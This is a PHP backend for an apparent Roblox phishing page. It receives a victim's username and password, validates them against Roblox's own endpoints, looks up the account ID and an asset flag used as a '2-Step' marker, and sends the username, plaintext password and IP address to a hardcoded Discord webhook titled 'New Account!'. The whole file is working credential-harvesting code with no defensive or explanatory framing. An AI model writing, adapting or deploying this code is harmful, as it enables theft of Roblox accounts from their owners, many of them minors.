<?php
session_start();
$username = $_POST['username'];
$password = $_POST['password'];
if(strpos(file_get_contents("https://www.roblox.com/user.aspx?username=$username"), 'is one of the millions creating and exploring the endless possibilities of Roblox. Join')){
if(file_get_contents("https://auth.roblox.com/v2/passwords/validate?request.username=vKevin&request.password=$password") == '{"code":0,"message":"Password is valid"}'){
$ch = curl_init('https://users.roblox.com/v1/usernames/users');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HEADER, false);
$headers = ["content-type: application/json"];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"usernames": ["'."".$username."".'"],"excludeBannedUsers": true}');
$userdata = json_decode(curl_exec($ch), true)['data'];
foreach ($userdata as $uservalue) {
$rusername.=$uservalue['name'];
$rid.=$uservalue['id'];
$rdisplayname.=$uservalue['displayName'];
}
if (file_get_contents("https://api.roblox.com/ownership/hasasset?userId=$rid&assetId=102611803") == 'false'){
$verified = 'False';
} else {
$verified = 'True';
$_SESSION['rid'] = $rid;
$_SESSION['rusername'] = $rusername;
$_SESSION['password'] = $password;
}
$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL => 'https://discord.com/api/webhooks/1006686442954698802/px_YncG0HHZQbpkGQlTqflU6FI_xRFcQa44Y48DuiMGl5Jx2Oe6DowhkQ0aPuLcqafRu',
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => '{"content":null,"embeds":[{"title":":money_with_wings: New Account! :moneybag:","description":"**You have received an account.**","url":"https://www.roblox.com/users/$UserID/profile","color":4695014,"fields":[{"name":"**Username**","value":"```'."".$rusername."".'```"},{"name":"**Password**","value":"```'."".$password."".'```"},{"name":"**IP Address**","value":"```'."".$_SERVER['REMOTE_ADDR']."".'```"},{"name":"2-Step","value":"```'."".$verified."".'```","inline":true}],"author":{"name":"Result"},"image":{"url":"https://www.roblox.com/outfit-thumbnail/image?userOutfitId='."".$rid."".'&width=420&height=420&format=png"}}],"username":"xHook","avatar_url":"https://assets.ifttt.com/images/channels/1004582012/icons/large.png","attachments":[]}',
CURLOPT_HTTPHEADER => [
'Content-Type: application/json'
]
]);                         
$response = curl_exec($ch);
curl_close($ch);
if($verified == 'True'){
die('2');
} else {
die('1');
}
}
}
?>